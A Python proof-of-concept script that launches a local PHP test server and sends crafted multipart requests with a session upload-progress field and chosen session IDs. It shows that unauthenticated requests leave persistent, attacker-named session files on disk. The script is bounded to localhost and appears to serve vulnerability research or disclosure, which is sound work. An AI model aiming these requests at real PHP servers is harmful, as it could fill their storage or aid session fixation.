#!/usr/bin/env python3
"""Bounded PoC: pre-auth Session upload progress creates persistent session files."""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import time
from pathlib import Path

PHP = "/tmp/php-postfuzz-cli"
SAVE_PATH = Path("/tmp/php-session-file-creation-poc")
BODY_WITH_FILE = (
    b'--b\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n'
    b'--b\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n'
    b'Content-Type: application/octet-stream\r\n\r\nX\r\n--b--\r\n'
)
BODY_MARKER_ONLY = (
    b'--b\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n'
    b'--b--\r\n'
)


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def wait_ready(process: subprocess.Popen, port: int) -> None:
    for _ in range(500):
        if process.poll() is not None:
            raise RuntimeError(f"server exited: {process.returncode}")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=.05):
                return
        except OSError:
            time.sleep(.01)
    raise TimeoutError("server startup")


def send(port: int, sid: str, body: bytes) -> str:
    request = (
        b"POST /empty.php HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
        b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=b\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    response = bytearray()
    with socket.create_connection(("127.0.0.1", port), timeout=3) as sock:
        sock.sendall(request)
        while True:
            data = sock.recv(65536)
            if not data:
                break
            response += data
    return bytes(response).split(b"\r\n", 1)[0].decode("ascii", "replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--php", default=PHP)
    parser.add_argument("--count", type=int, default=100)
    parser.add_argument("--marker-only", action="store_true")
    parser.add_argument("--file-uploads-off", action="store_true")
    parser.add_argument("--fixed-cookie", action="store_true", help="reuse one PHPSESSID for every request")
    parser.add_argument("--strict-mode", action="store_true")
    parser.add_argument("--cleanup-off", action="store_true")
    parser.add_argument("--progress-off", action="store_true")
    parser.add_argument("--system-allocator", action="store_true", help="set USE_ZEND_ALLOC=0 (sanitizer diagnostics only)")
    parser.add_argument("--keep", action="store_true")
    args = parser.parse_args()
    body = BODY_MARKER_ONLY if args.marker_only else BODY_WITH_FILE

    shutil.rmtree(SAVE_PATH, ignore_errors=True)
    SAVE_PATH.mkdir(mode=0o700)
    port = free_port()
    log = tempfile.NamedTemporaryFile(prefix="session-file-poc-", suffix=".log", delete=False)
    env = os.environ.copy()
    env.pop("USE_ZEND_ALLOC", None)
    if args.system_allocator:
        env.update({"USE_ZEND_ALLOC": "0", "ASAN_OPTIONS": "detect_leaks=0"})
    command = [
        args.php, "-n", "-d", "display_errors=0", "-d", "log_errors=0",
        "-d", f"session.save_path={SAVE_PATH}",
        "-d", "session.upload_progress.enabled=" + ("0" if args.progress_off else "1"),
        "-d", "session.upload_progress.cleanup=" + ("0" if args.cleanup_off else "1"),
        "-d", "session.use_strict_mode=" + ("1" if args.strict_mode else "0"),
        "-d", "file_uploads=" + ("0" if args.file_uploads_off else "1"),
        "-S", f"127.0.0.1:{port}", "-t", "/tmp/poc",
    ]
    process = subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=log, env=env)
    expected = []
    try:
        wait_ready(process, port)
        for index in range(args.count):
            sid = "a" * 32 if args.fixed_cookie else f"{index:032x}"
            expected.append(SAVE_PATH / f"sess_{sid}")
            status = send(port, sid, body)
            if "200" not in status:
                raise RuntimeError(f"request {index} returned {status}")
    finally:
        if process.poll() is None:
            process.terminate(); process.wait(timeout=5)
        log.close()

    files = list(SAVE_PATH.glob("sess_*"))
    matching = len({path for path in expected if path.exists()})
    zero_length = sum(path.stat().st_size == 0 for path in files)
    print(f"requests={args.count}")
    print(f"persistent_session_files={len(files)}")
    print(f"attacker_named_files={matching}")
    print(f"zero_length_files={zero_length}")
    print(f"marker_only={args.marker_only}")
    print(f"file_uploads={not args.file_uploads_off}")
    print(f"fixed_cookie={args.fixed_cookie}")
    print(f"strict_mode={args.strict_mode}")
    print(f"upload_progress={not args.progress_off}")
    print(f"upload_progress_cleanup={not args.cleanup_off}")
    print(f"zend_mm={not args.system_allocator}")
    print(f"request_body_bytes={len(body)}")
    print(f"save_path={SAVE_PATH}")

    if args.progress_off or (args.marker_only and args.cleanup_off):
        success = len(files) == 0
    elif args.marker_only:
        # Without FILE_START, cleanup initializes a fresh random session rather
        # than adopting the supplied ID. One persistent file still results.
        success = len(files) == zero_length == args.count
    else:
        expected_unique = 1 if args.fixed_cookie else args.count
        success = len(files) == matching == zero_length == expected_unique
    if not args.keep:
        shutil.rmtree(SAVE_PATH, ignore_errors=True)
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
